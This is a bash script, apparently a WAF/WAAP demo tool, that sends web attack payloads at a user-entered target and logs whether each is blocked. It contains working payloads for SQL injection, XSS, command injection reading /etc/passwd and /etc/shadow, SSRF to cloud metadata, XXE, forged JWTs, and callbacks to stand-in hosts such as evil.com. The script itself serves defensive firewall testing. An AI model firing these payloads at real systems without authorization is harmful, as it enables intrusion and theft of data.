#!/usr/bin/env bash
set -euo pipefail

# =============================================================
# Universal Attack Simulation Framework (UASF) v2.0
# Controlled, demo-safe PoC attack generator for WAAP/WAF demos
# Compatible with bash 3.2+ (macOS default)
# • GET + POST support • Low/controlled RPS • Evidence collection
# • For authorized testing and demonstration purposes only
# =============================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Source library modules if available
[[ -f "$SCRIPT_DIR/lib/http_methods.sh" ]] && source "$SCRIPT_DIR/lib/http_methods.sh"
[[ -f "$SCRIPT_DIR/lib/evasion.sh" ]] && source "$SCRIPT_DIR/lib/evasion.sh"
[[ -f "$SCRIPT_DIR/lib/detection.sh" ]] && source "$SCRIPT_DIR/lib/detection.sh"
[[ -f "$SCRIPT_DIR/lib/report.sh" ]] && source "$SCRIPT_DIR/lib/report.sh"

# ---------------- Defaults ----------------
RPS_DEFAULT=3
TIMEOUT_DEFAULT=8
CONC_DEFAULT=2
ENABLE_POST=false
ENABLE_API_TESTS=false

# Extended User-Agent pool for bot detection testing
UA_POOL=(
  "sqlmap/1.7"
  "nikto/2.5"
  "Acunetix Web Vulnerability Scanner"
  "python-requests/2.31"
  "EvilBot/1.0"
  "curl/8.0"
  "Go-http-client/1.1"
  "HeadlessChrome/120.0.0.0"
  "PhantomJS/2.1.1"
  "Wget/1.21"
  "masscan/1.0"
  "nuclei/2.9"
  "httpx"
  "zgrab/0.x"
  "Burp Suite"
  "OWASP ZAP"
)

# Legitimate-looking UAs for stealth testing
LEGIT_UA_POOL=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# ---------------- Helpers ----------------
C_RESET="\033[0m"; C_RED="\033[31m"; C_GREEN="\033[32m"; C_YELLOW="\033[33m"; C_CYAN="\033[36m"
color()  { printf "\033[%sm%s\033[0m" "$1" "$2"; }
header() { echo; color "1;36" "═══ $1 ═══"; echo; }
pick_ua(){ echo "${UA_POOL[$((RANDOM % ${#UA_POOL[@]}))]}";}
pick_legit_ua(){ echo "${LEGIT_UA_POOL[$((RANDOM % ${#LEGIT_UA_POOL[@]}))]}";}

ts="$(date +%Y%m%d_%H%M%S)"
OUTDIR="./uasf_out_${ts}"
EVID="$OUTDIR/evidence"
CSV="$OUTDIR/results.csv"
JSONL="$OUTDIR/results.ndjson"
HTML="$OUTDIR/report.html"
CID="UASF-$(date +%s)-$RANDOM"

mkdir -p "$OUTDIR" "$EVID"

# ---------------- UX: minimal, guided interface ----------------
clear
echo "╔════════════════════════════════════════════════════════════╗"
echo "║    Universal Attack Simulation Framework (UASF) v2.0      ║"
echo "║    Enhanced for AppTrana WAAP Testing                      ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo
read -rp "Target (e.g., https://demo.target.com): " BASE
BASE="${BASE%/}"

# Optional DNS info
if command -v host >/dev/null 2>&1; then
  echo "• DNS info:"
  host "$(echo "$BASE" | sed 's~https\?://~~')" 2>/dev/null || true
fi
echo

echo "Select profile:"
echo "  1) Quick Demo      (lightweight, essential modules)"
echo "  2) Extended Demo   (broad coverage, demo-safe)"
echo "  3) Full Security   (all modules including advanced evasion)"
echo "  4) API Testing     (JSON/GraphQL API security)"
echo "  5) Custom          (manually choose modules)"
read -rp "Choice (1/2/3/4/5): " PROFILE

RPS=$RPS_DEFAULT; TIMEOUT=$TIMEOUT_DEFAULT; CONC=$CONC_DEFAULT
case "$PROFILE" in
  1) RPS=3; CONC=1 ;;
  2) RPS=4; CONC=2 ;;
  3) RPS=5; CONC=3 ;;
  4) RPS=3; CONC=2; ENABLE_POST=true; ENABLE_API_TESTS=true ;;
esac

echo
echo "HTTP Method support:"
echo "  1) GET only (safest, default)"
echo "  2) Include POST requests"
read -rp "Choice [1]: " METHOD_CHOICE
[[ "${METHOD_CHOICE:-1}" == "2" ]] && ENABLE_POST=true

echo
echo "Defaults → RPS=${RPS}, TIMEOUT=${TIMEOUT}s, Concurrency=${CONC}"
read -rp "RPS (Enter to keep=${RPS}): " RPS_INP || true
read -rp "TIMEOUT seconds (Enter to keep=${TIMEOUT}): " TO_INP || true
read -rp "Concurrency (Enter to keep=${CONC}): " CC_INP || true
[[ -n "${RPS_INP:-}" ]] && RPS="$RPS_INP"
[[ -n "${TO_INP:-}"  ]] && TIMEOUT="$TO_INP"
[[ -n "${CC_INP:-}"  ]] && CONC="$CC_INP"

# Interval per request from RPS (never < 0.1)
INTERVAL=$(awk -v r="$RPS" 'BEGIN{ if (r<=0) r=1; printf("%.3f", 1.0/r) }')

# ---------------- Module Catalog (indexed arrays for bash 3.2 compatibility) ----------------
# Module names by index
MODULE_NAMES=(
  ""  # Index 0 unused
  "SQL Injection – Basic"
  "SQL Injection – Union"
  "SQL Injection – Evasion (encodings)"
  "XSS – Basic"
  "XSS – Variants (img/js URI)"
  "Local File Inclusion / Path Traversal"
  "Remote File Inclusion (signature)"
  "Open Redirect (signature)"
  "NoSQL Injection (signature)"
  "LDAP Injection (signature)"
  "Command Injection (signature)"
  "SSRF (signature)"
  "Header Injection / CRLF (signature)"
  "CORS / Origin probes (read-only)"
  "Cache Poisoning (signature)"
  "Host Header Injection (signature)"
  "Directory Listing Probe"
  "Sensitive Files Probe"
  "WordPress Core Probes"
  "WordPress REST API"
  "Contact Form 7 (REST/query signatures)"
  "Ultimate Member (AJAX/query signatures)"
  "CoBlocks (frontend param signatures)"
  "Kubio (frontend param signatures)"
  "GTranslate (frontend param signatures)"
  "Bad-Bot User-Agents (home/page probes)"
  "Bot Pulse (short, safe)"
  "SQLi – Advanced Evasion (double encoding)"
  "SQLi – Unicode/Case Mix Bypass"
  "XSS – DOM-based & Mutation"
  "API – JSON Injection"
  "API – GraphQL Introspection"
  "HTTP Parameter Pollution"
  "HTTP Request Smuggling (signatures)"
  "Rate Limit Detection"
  "Advanced Bot Detection Bypass"
  "Client-Side Attacks (Magecart patterns)"
  "XXE Injection (signatures)"
  "JWT Manipulation (signatures)"
  "Prototype Pollution (signatures)"
  "Header Spoofing / IP Bypass"
)

TOTAL_MODULES=${#MODULE_NAMES[@]}

# ---------------- Get payloads for a module (function instead of associative array) ----------------
get_payloads() {
  local module_id="$1"
  local b="$BASE"
  
  case "$module_id" in
    1) # SQL Injection – Basic
      echo "$b/?id=1%27%20OR%20%271%27%3D%271"
      echo "$b/?user=admin%27--&pass=test"
      echo "$b/wp-admin/admin-ajax.php?action=um_fetch_user&q=%27%20OR%201%3D1--"
      ;;
    2) # SQL Injection – Union
      echo "$b/?s=%27%20UNION%20SELECT%20NULL--%20"
      echo "$b/?q=1%27%20UNION%20SELECT%201,2,3--%20"
      ;;
    3) # SQL Injection – Evasion
      echo "$b/?id=%251%2527%2520OR%2520%25271%2527%253D%25271"
      echo "$b/?id=%271%27%2520or%2520%271%27%253D%271"
      ;;
    4) # XSS – Basic
      echo "$b/search?q=%3Csvg/onload%3Dalert(1)%3E"
      echo "$b/?q=%3Cscript%3Ealert(1)%3C/script%3E"
      ;;
    5) # XSS – Variants
      echo "$b/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
      echo "$b/?next=javascript:alert(1)"
      echo "$b/wp-json/wp/v2/search?search=%3Csvg/onload%3Dalert(1)%3E"
      ;;
    6) # LFI / Path Traversal
      echo "$b/download?file=../../../../etc/passwd"
      echo "$b/images/../../../etc/hosts"
      echo "$b/?page=....//....//etc/passwd"
      echo "$b/?file=..%252f..%252f..%252fetc/passwd"
      ;;
    7) # RFI
      echo "$b/include?page=http://evil.com/shell.txt"
      echo "$b/?file=https://attacker.com/malicious.php"
      ;;
    8) # Open Redirect
      echo "$b/?redirect=http://evil.com"
      echo "$b/?next=http://evil.com"
      echo "$b/?url=http://evil.com"
      echo "$b/?continue=https://attacker.com"
      echo "$b/?return_url=//evil.com"
      ;;
    9) # NoSQL Injection (URL-encoded special chars)
      echo "$b/api/user?username%5B%24ne%5D=1&password%5B%24ne%5D=1"
      echo "$b/?filter=%24where:alert(1)"
      echo "$b/api/search?q=%7B%22%24gt%22%3A%22%22%7D"
      ;;
    10) # LDAP Injection
      echo "$b/?user=*)(uid=*)"
      echo "$b/?search=*)(&"
      echo "$b/?filter=(cn=*)"
      ;;
    11) # Command Injection
      echo "$b/?host=127.0.0.1;cat%20/etc/passwd"
      echo "$b/?cmd=%7C%7Cwhoami"
      echo "$b/?ping=\`id\`"
      echo "$b/?exec=\$(cat%20/etc/shadow)"
      ;;
    12) # SSRF
      echo "$b/?target=http://169.254.169.254/latest/meta-data/"
      echo "$b/?fetch=http://127.0.0.1:80"
      echo "$b/?callback=http://internal.example/"
      echo "$b/?url=http://localhost:22"
      echo "$b/?proxy=http://[::1]:8080"
      ;;
    13) # Header Injection / CRLF
      echo "$b/?x=%0d%0aSet-Cookie:inject=1"
      echo "$b/?header=%0aX-Injected:%20malicious"
      ;;
    14) # CORS probes
      echo "$b/?origin-test=1"
      echo "$b/?cors-probe=1"
      ;;
    15) # Cache Poisoning
      echo "$b/?x-forwarded-host=evil.com"
      echo "$b/?x-original-url=/admin"
      ;;
    16) # Host Header Injection
      echo "$b/?host=evil.com"
      ;;
    17) # Directory Listing
      echo "$b/wp-content/"
      echo "$b/wp-includes/"
      echo "$b/.git/"
      echo "$b/backup/"
      ;;
    18) # Sensitive Files
      echo "$b/.env"
      echo "$b/server-status"
      echo "$b/robots.txt"
      echo "$b/.htaccess"
      echo "$b/config.php.bak"
      echo "$b/web.config"
      echo "$b/phpinfo.php"
      ;;
    19) # WordPress Core
      echo "$b/?s=test"
      echo "$b/?p=1"
      echo "$b/?author=1"
      ;;
    20) # WordPress REST API
      echo "$b/wp-json/"
      echo "$b/wp-json/wp/v2/users?search=%27%20OR%201%3D1--"
      ;;
    21) # Contact Form 7
      echo "$b/wp-json/contact-form-7/v1/contact-forms?search=%27%20OR%201%3D1--"
      ;;
    22) # Ultimate Member
      echo "$b/wp-admin/admin-ajax.php?action=um_get_members&roles=administrator%27--"
      echo "$b/?um_search=%3Cscript%3Ealert(1)%3C/script%3E"
      ;;
    23) # CoBlocks
      echo "$b/wp-content/plugins/coblocks/dist/js/coblocks-animation.js?cb=%3Csvg/onload%3Dalert(1)%3E"
      ;;
    24) # Kubio
      echo "$b/wp-content/plugins/kubio/build/frontend/index.js?tpl=../../../../etc/hosts"
      ;;
    25) # GTranslate
      echo "$b/wp-content/plugins/gtranslate/js/base.js?lang=%3Csvg/onload%3Dalert(1)%3E"
      ;;
    26) # Bad-Bot UAs
      echo "$b/"
      echo "$b/?page_id=1"
      ;;
    27) # Bot Pulse - handled specially
      ;;
    28) # SQLi – Advanced Evasion
      echo "$b/?id=%2527%2520OR%2520%25271%2527%253D%25271"
      echo "$b/?id=%25252527%252520OR%25252520%252525271%25252527%2525253D%252525271"
      echo "$b/?q=1%2527%2520UNION%2520SELECT%2520NULL--%2520"
      echo "$b/?id=1'/**/OR/**/1=1--"
      echo "$b/?id=1'%00OR%001=1--"
      ;;
    29) # SQLi – Unicode/Case Mix
      echo "$b/?id=1%u0027%20OR%20%u00271%u0027=%u00271"
      echo "$b/?id=1'%20oR%20'1'='1"
      echo "$b/?id=1'%20UnIoN%20SeLeCt%20NULL--"
      echo "$b/?id=1'%09OR%091=1--"
      echo "$b/?id=1'%0AOR%0A1=1--"
      ;;
    30) # XSS – DOM-based
      echo "$b/#%3Cscript%3Ealert(1)%3C/script%3E"
      echo "$b/?callback=javascript:alert(document.cookie)"
      echo "$b/?data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      echo "$b/?payload=%3CScRiPt%3Ealert(1)%3C/sCrIpT%3E"
      echo "$b/?x=%3Csvg%09onload%3Dalert(1)%3E"
      echo "$b/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%601%60%3E"
      ;;
    31) # API – JSON Injection - handled specially (POST)
      ;;
    32) # API – GraphQL - handled specially (POST)
      ;;
    33) # HTTP Parameter Pollution
      echo "$b/?id=1&id=2%27%20OR%20%271%27%3D%271"
      echo "$b/?user=admin&user=admin%27--"
      echo "$b/?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E"
      echo "$b/?filter=1&filter=\$ne&filter=null"
      ;;
    34) # HTTP Request Smuggling
      echo "$b/?smuggle=CL.TE"
      echo "$b/?te=chunked"
      echo "$b/?smuggle_test=1"
      ;;
    35) # Rate Limit Detection - handled specially
      ;;
    36) # Advanced Bot Detection - handled specially
      ;;
    37) # Client-Side Attacks
      echo "$b/?callback=https://evil.com/collect"
      echo "$b/?onload=eval(atob('YWxlcnQoMSk='))"
      echo "$b/?script=//evil.com/malicious.js"
      echo "$b/?exfil=//attacker.com/pixel.gif"
      echo "$b/?payment_callback=//evil.com/steal"
      ;;
    38) # XXE Injection
      echo "$b/?xml=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%5D%3E"
      echo "$b/?data=%3Cfoo%3E%26xxe%3B%3C/foo%3E"
      echo "$b/?import=file:///etc/passwd"
      ;;
    39) # JWT Manipulation
      echo "$b/?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9."
      echo "$b/?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.invalid"
      echo "$b/api/auth?alg=none"
      ;;
    40) # Prototype Pollution (URL-encoded brackets)
      echo "$b/?__proto__%5Badmin%5D=true"
      echo "$b/?constructor%5Bprototype%5D%5Badmin%5D=true"
      echo "$b/api/merge?__proto__.polluted=true"
      echo "$b/?config%5B__proto__%5D%5BisAdmin%5D=1"
      ;;
    41) # Header Spoofing - handled specially
      ;;
  esac
}

# ---------------- Transport base ----------------
CURL_BASE=(-sS -L --max-time "$TIMEOUT" -H "Cache-Control: no-cache" -H "X-UASF-Correlation: $CID")
echo "timestamp,module,code,ms,size,ip,url,verdict" > "$CSV"
: > "$JSONL"

# Bot pulse function
bot_pulse() {
  echo
  header "Bot Pulse (20 requests, malicious UAs – safe)"
  for i in $(seq 1 20); do
    ua="$(pick_ua)"
    curl -sS -o /dev/null -w "." -A "$ua" \
      -H "X-UASF-Correlation: $CID" \
      --max-time "$TIMEOUT" \
      "$BASE/?pulse=$i" 2>/dev/null || true
    sleep 0.2
  done
  echo
}

# Rate limit detection function
rate_limit_test() {
  header "Rate Limit Detection (burst test - 50 requests)"
  local blocked=0
  for i in $(seq 1 50); do
    local code
    code=$(curl -sS -o /dev/null -w "%{http_code}" \
      -H "X-UASF-Correlation: $CID" \
      --max-time 3 "$BASE/?rate_test=$i" 2>/dev/null) || code="000"
    printf "."
    if [[ "$code" == "429" || "$code" =~ ^5[0-9][0-9]$ ]]; then
      blocked=1
      echo
      echo -e "${C_RED}[BLOCK]${C_RESET} Rate limit triggered at request $i (HTTP $code)"
      printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
        "$(date +%Y-%m-%dT%H:%M:%S%z)" "Rate Limit Detection" "$code" "0" "0" "-" "$BASE/?rate_test=$i" "BLOCK" >> "$CSV"
      break
    fi
  done
  echo
  if [[ $blocked -eq 0 ]]; then
    echo -e "${C_YELLOW}[WARN]${C_RESET} No rate limit detected in 50 requests"
    printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
      "$(date +%Y-%m-%dT%H:%M:%S%z)" "Rate Limit Detection" "200" "0" "0" "-" "$BASE/?rate_test=50" "WARN" >> "$CSV"
  fi
}

# Advanced bot detection test
advanced_bot_test() {
  header "Advanced Bot Detection Bypass"
  
  local test_uas=("sqlmap/1.7|scanner"
    "Googlebot/2.1|fake_googlebot"
    "Mozilla/5.0 (compatible; AhrefsBot/7.0)|seo_bot"
    "HeadlessChrome/120.0.0.0|headless"
    "python-requests/2.31|automation"
    "$(pick_legit_ua)|legit_browser")
  
  for entry in "${test_uas[@]}"; do
    IFS='|' read -r ua bot_type <<< "$entry"
    local code
    code=$(curl -sS -o /dev/null -w "%{http_code}" \
      -A "$ua" \
      -H "X-UASF-Correlation: $CID" \
      -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
      -H "Accept-Language: en-US,en;q=0.5" \
      --max-time 5 "$BASE/" 2>/dev/null) || code="000"
    
    local verdict tag
    if [[ "$code" =~ ^40(3|6|9)$ || "$code" == "429" ]]; then
      verdict="BLOCK"; tag="${C_RED}[BLOCK]${C_RESET}"
    else
      verdict="ALLOW"; tag="${C_GREEN}[ALLOW]${C_RESET}"
    fi
    
    echo -e "$tag Bot Type: $bot_type (HTTP $code)"
    printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
      "$(date +%Y-%m-%dT%H:%M:%S%z)" "Advanced Bot Detection Bypass" "$code" "0" "0" "-" "$BASE/ [UA:$bot_type]" "$verdict" >> "$CSV"
    
    sleep "$INTERVAL"
  done
}

# Header spoofing attack
header_spoofing_attack() {
  header "Header Spoofing / IP Bypass"
  
  local spoof_headers=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Forwarded-Host: evil.com"
    "X-Custom-IP-Authorization: 127.0.0.1"
  )
  
  for hdr in "${spoof_headers[@]}"; do
    local code size
    # Ensure URL has proper scheme
    local target_url="$BASE"
    [[ ! "$target_url" =~ ^https?:// ]] && target_url="https://$target_url"
    read -r code size < <(
      curl -sS -L -o /dev/null -w "%{http_code} %{size_download}" \
        -H "$hdr" \
        -H "X-UASF-Correlation: $CID" \
        -A "$(pick_ua)" \
        --max-time "$TIMEOUT" "$target_url/" 2>/dev/null
    ) || { code="000"; size="0"; }
    
    local verdict tag
    if [[ "$code" =~ ^40(3|6|9)$ || "$code" == "451" ]]; then
      verdict="BLOCK"; tag="${C_RED}[BLOCK]${C_RESET}"
    elif [[ "$code" == "200" ]]; then
      verdict="PASS"; tag="${C_GREEN}[PASS]${C_RESET}"
    else
      verdict="WARN"; tag="${C_YELLOW}[WARN]${C_RESET}"
    fi
    
    echo -e "$tag Header: ${hdr%%:*} → HTTP $code"
    printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
      "$(date +%Y-%m-%dT%H:%M:%S%z)" "Header Spoofing / IP Bypass" "$code" "0" "$size" "-" "$BASE/ [HDR:${hdr%%:*}]" "$verdict" >> "$CSV"
    
    sleep "$INTERVAL"
  done
}

# API JSON injection test (POST)
api_json_test() {
  if [[ "$ENABLE_POST" != "true" ]]; then
    echo "  (Skipped - POST not enabled)"
    return
  fi
  
  header "API – JSON Injection"
  
  local payloads=(
    '/api/user|{"username":"admin'\''--","password":"test"}'
    '/api/login|{"user":"'\'' OR '\''1'\''='\''1","pass":"x"}'
    '/api/search|{"query":"<script>alert(1)</script>"}'
    '/api/data|{"$where":"this.password.match(/.*/)!=null"}'
  )
  
  for payload in "${payloads[@]}"; do
    IFS='|' read -r path body <<< "$payload"
    local full_url="${BASE}${path}"
    local ua; ua="$(pick_ua)"
    local code size
    
    read -r code size < <(
      curl -sS -o /dev/null -w "%{http_code} %{size_download}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "X-UASF-Correlation: $CID" \
        -A "$ua" \
        -d "$body" \
        --max-time "$TIMEOUT" "$full_url" 2>/dev/null
    ) || { code="000"; size="0"; }
    
    local verdict tag
    if [[ "$code" =~ ^40(3|6|9)$ || "$code" =~ ^50[0-9]$ ]]; then
      verdict="BLOCK"; tag="${C_RED}[BLOCK]${C_RESET}"
    elif [[ "$code" =~ ^2[0-9][0-9]$ ]]; then
      verdict="PASS"; tag="${C_GREEN}[PASS]${C_RESET}"
    else
      verdict="WARN"; tag="${C_YELLOW}[WARN]${C_RESET}"
    fi
    
    echo -e "$tag [POST] $path → HTTP $code"
    printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
      "$(date +%Y-%m-%dT%H:%M:%S%z)" "API – JSON Injection" "$code" "0" "$size" "-" "$full_url" "$verdict" >> "$CSV"
    
    sleep "$INTERVAL"
  done
}

# API GraphQL test (POST)
api_graphql_test() {
  if [[ "$ENABLE_POST" != "true" ]]; then
    echo "  (Skipped - POST not enabled)"
    return
  fi
  
  header "API – GraphQL Introspection"
  
  local payloads=(
    '/graphql|{"query":"{ __schema { types { name } } }"}'
    '/graphql|{"query":"{ user(id: \"1'\'' OR '\''1'\''='\''1\") { id name } }"}'
    '/api/graphql|{"query":"mutation { login(username: \"admin'\''--\", password: \"x\") { token } }"}'
  )
  
  for payload in "${payloads[@]}"; do
    IFS='|' read -r path body <<< "$payload"
    local full_url="${BASE}${path}"
    local ua; ua="$(pick_ua)"
    local code size
    
    read -r code size < <(
      curl -sS -o /dev/null -w "%{http_code} %{size_download}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "X-UASF-Correlation: $CID" \
        -A "$ua" \
        -d "$body" \
        --max-time "$TIMEOUT" "$full_url" 2>/dev/null
    ) || { code="000"; size="0"; }
    
    local verdict tag
    if [[ "$code" =~ ^40(3|6|9)$ || "$code" =~ ^50[0-9]$ ]]; then
      verdict="BLOCK"; tag="${C_RED}[BLOCK]${C_RESET}"
    elif [[ "$code" =~ ^2[0-9][0-9]$ ]]; then
      verdict="PASS"; tag="${C_GREEN}[PASS]${C_RESET}"
    else
      verdict="WARN"; tag="${C_YELLOW}[WARN]${C_RESET}"
    fi
    
    echo -e "$tag [POST] $path → HTTP $code"
    printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
      "$(date +%Y-%m-%dT%H:%M:%S%z)" "API – GraphQL Introspection" "$code" "0" "$size" "-" "$full_url" "$verdict" >> "$CSV"
    
    sleep "$INTERVAL"
  done
}

# Main attack function
attack_one() {
  local module="$1" url="$2"
  local ua; ua="$(pick_ua)"
  local tmp start end ms http size ip eff
  tmp="$(mktemp)"
  # Use perl for milliseconds (macOS compatible), fallback to seconds
  if command -v perl &>/dev/null; then
    start=$(perl -MTime::HiRes=time -e 'printf "%.0f", time*1000')
  else
    start=$(date +%s)000
  fi
  read -r http size ip eff < <(
    curl "${CURL_BASE[@]}" -A "$ua" -D - -o "$tmp" \
      -w "%{http_code} %{size_download} %{remote_ip} %{url_effective}\n" \
      "$url" 2>/dev/null | tail -n1
  ) || { http="000"; size="0"; ip="-"; eff="$url"; }
  if command -v perl &>/dev/null; then
    end=$(perl -MTime::HiRes=time -e 'printf "%.0f", time*1000')
  else
    end=$(date +%s)000
  fi
  ms=$((end-start))

  # WAF detection hint (first 8KB)
  local waf_hint=""
  if head -c 8192 "$tmp" 2>/dev/null | grep -Eiq '(apptrana|indusface|mod.?security|access.?denied|request.?was.?blocked|not.?acceptable|forbidden|web.?application.?firewall|security.?policy|blocked.?by)'; then
    waf_hint="waf"
  fi

  local verdict tag
  if [[ "$http" =~ ^2[0-9][0-9]$ ]]; then
    if [[ -n "$waf_hint" ]]; then
      verdict="BLOCK"; tag="$(color 31 "[BLOCK]")"
    else
      verdict="PASS";  tag="$(color 32 "[PASS]")"
    fi
  elif [[ "$http" =~ ^40(3|6|9)$ || "$http" == "451" || "$http" =~ ^49[789]$ || "$http" =~ ^50[0-9]$ || -n "$waf_hint" ]]; then
    verdict="BLOCK"; tag="$(color 31 "[BLOCK]")"
  elif [[ "$http" == "404" ]]; then
    verdict="WARN";  tag="$(color 33 "[WARN]")"
  elif [[ "$http" == "429" ]]; then
    verdict="RATE_LIMITED"; tag="$(color 33 "[RATE]")"
  else
    verdict="WARN";  tag="$(color 33 "[WARN]")"
  fi

  printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
    "$(date +%Y-%m-%dT%H:%M:%S%z)" "$module" "$http" "$ms" "$size" "${ip:-"-"}" "$eff" "$verdict" >> "$CSV"
  printf '{"ts":"%s","module":"%s","code":%s,"ms":%s,"bytes":%s,"ip":"%s","url":"%s","verdict":"%s"}\n' \
    "$(date +%s)" "$module" "$http" "$ms" "$size" "${ip:-""}" "$eff" "$verdict" >> "$JSONL"

  echo -e "$tag $module  $http  ${ms}ms → $url"

  # Preserve evidence for blocks (first 8KB)
  if [[ "$verdict" == "BLOCK" ]]; then
    head -c 8192 "$tmp" > "$EVID/$(date +%s)_${http}_$(echo "$module" | tr -cd '[:alnum:]-').txt" 2>/dev/null || true
  fi
  rm -f "$tmp" 2>/dev/null || true
}

run_module() {
  local module_id="$1"
  local module_name="${MODULE_NAMES[$module_id]:-}"
  
  [[ -z "$module_name" ]] && return
  
  # Handle special modules
  case "$module_id" in
    27) # Bot Pulse
      bot_pulse
      return
      ;;
    31) # API – JSON Injection
      api_json_test
      return
      ;;
    32) # API – GraphQL
      api_graphql_test
      return
      ;;
    35) # Rate Limit Detection
      rate_limit_test
      return
      ;;
    36) # Advanced Bot Detection
      advanced_bot_test
      return
      ;;
    41) # Header Spoofing
      header_spoofing_attack
      return
      ;;
  esac
  
  # Standard GET-based modules
  local payloads
  payloads=$(get_payloads "$module_id")
  [[ -z "$payloads" ]] && return
  
  header "$module_name"
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    while [[ $(jobs -pr | wc -l) -ge $CONC ]]; do wait -n 2>/dev/null || sleep 0.1; done
    attack_one "$module_name" "$url" &
    sleep "$INTERVAL"
  done <<< "$payloads"
  wait 2>/dev/null || true
}

# ---------------- Selection ----------------
SELECTION=""
case "$PROFILE" in
  1) SELECTION="1,4,6,8,19,26,27" ;;
  2) SELECTION="1-8,9-12,13-16,17-19,20-27" ;;
  3) SELECTION="1-27,28-41" ;;
  4) SELECTION="31,32,28,29,35,36,41" ;;
  5)
    echo
    echo "Available modules (enter numbers, commas and ranges allowed, e.g., 1,3,7-10,28-41):"
    for i in $(seq 1 $((TOTAL_MODULES - 1))); do
      [[ -n "${MODULE_NAMES[$i]:-}" ]] && printf "  %2d) %s\n" "$i" "${MODULE_NAMES[$i]}"
    done
    echo
    read -rp "Selection: " SELECTION
    ;;
esac

parse_selection() {
  local input="$1"; local out=""
  IFS=',' read -ra parts <<< "$input"
  for p in "${parts[@]}"; do
    if [[ "$p" =~ ^[0-9]+-[0-9]+$ ]]; then
      IFS='-' read -r a b <<< "$p"
      for n in $(seq "$a" "$b"); do out="$out $n"; done
    elif [[ "$p" =~ ^[0-9]+$ ]]; then
      out="$out $p"
    fi
  done
  echo "$out"
}
IDX=$(parse_selection "$SELECTION")

echo
echo "╔════════════════════════════════════════════════════════════╗"
echo "║  Configuration Summary                                     ║"
echo "╠════════════════════════════════════════════════════════════╣"
echo "  Target:         $BASE"
echo "  RPS:            $RPS"
echo "  Timeout:        ${TIMEOUT}s"
echo "  Concurrency:    $CONC"
echo "  POST Enabled:   $ENABLE_POST"
echo "  Correlation-ID: $CID"
echo "  Logs:           $CSV | $JSONL"
echo "  Evidence:       $EVID/"
echo "╚════════════════════════════════════════════════════════════╝"
echo

# Execute selected modules
for n in $IDX; do
  run_module "$n"
done

# ---------------- Generate Enhanced HTML Report ----------------
if type generate_enhanced_report &>/dev/null; then
  generate_enhanced_report "$CSV" "$HTML" "$BASE" "$CID" "$EVID"
else
  # Fallback to basic report
  codes=$(awk -F',' 'NR>1{c[$3]++} END{for(k in c) printf "<tr><td>%s</td><td>%d</td></tr>\n",k,c[k]}' "$CSV" 2>/dev/null) || codes=""
  mods=$(awk -F',' 'NR>1{m[$2]++} END{for(k in m) printf "<tr><td>%s</td><td>%d</td></tr>\n",k,m[k]}' "$CSV" 2>/dev/null) || mods=""
  samples=$(awk -F',' 'NR>1 && NR<=101{gsub("&","\\&amp;",$7); gsub("<","\\&lt;",$7); printf "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td style=\"word-break:break-all\">%s</td><td>%s</td></tr>\n",$1,$2,$3,$4,$5,$6,$7,$8}' "$CSV" 2>/dev/null) || samples=""
  
  cat > "$HTML" <<HTML
<!doctype html><meta charset="utf-8"><title>UASF Report</title>
<style>body{font-family:system-ui,Segoe UI,Arial;margin:24px;background:#1a1a2e;color:#e0e0e0}table{border-collapse:collapse;width:100%}td,th{border:1px solid #333;padding:6px 10px}th{background:#252540;color:#00d4ff}h2{color:#00d4ff}</style>
<h2>Universal Attack Simulation Framework (UASF) v2.0</h2>
<p><b>Target:</b> $BASE<br><b>Correlation:</b> $CID<br><b>Generated:</b> $(date)</p>
<h3>HTTP Codes</h3><table><tr><th>Code</th><th>Count</th></tr>$codes</table>
<h3>Modules</h3><table><tr><th>Module</th><th>Count</th></tr>$mods</table>
<h3>Samples (100)</h3><table><tr><th>Time</th><th>Module</th><th>Code</th><th>ms</th><th>Bytes</th><th>IP</th><th>URL</th><th>Verdict</th></tr>$samples</table>
<p>Evidence: $(ls -1 "$EVID" 2>/dev/null | wc -l | tr -d ' ') files under <code>$EVID/</code></p>
HTML
fi

echo
color "1;32" "═══ Completed ✅ ═══"; echo
echo "Open the HTML report: $HTML"
echo "Review your WAAP/WAF console (Attacks / Trends / Bot) with Correlation-ID: $CID"
echo
